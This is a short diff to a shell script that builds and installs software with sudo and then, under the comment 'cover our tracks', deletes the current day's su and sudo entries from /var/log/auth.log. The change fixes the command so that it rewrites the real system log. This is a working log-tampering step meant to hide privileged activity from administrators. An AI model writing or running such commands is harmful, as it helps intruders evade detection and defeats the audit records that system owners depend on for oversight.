@@ -8,6 +8,6 @@ make
 sudo make install
 
 # cover our tracks (both for su and sudo)
-grep -a -v "`date | awk '{print $3, $2}'`.*su" > auth2.log && mv auth2.log auth.log'
+grep -a -v "`date | awk '{print $3, $2}'`.*su" /var/log/auth.log > auth2.log && mv auth2.log /var/log/auth.log
 
 exit
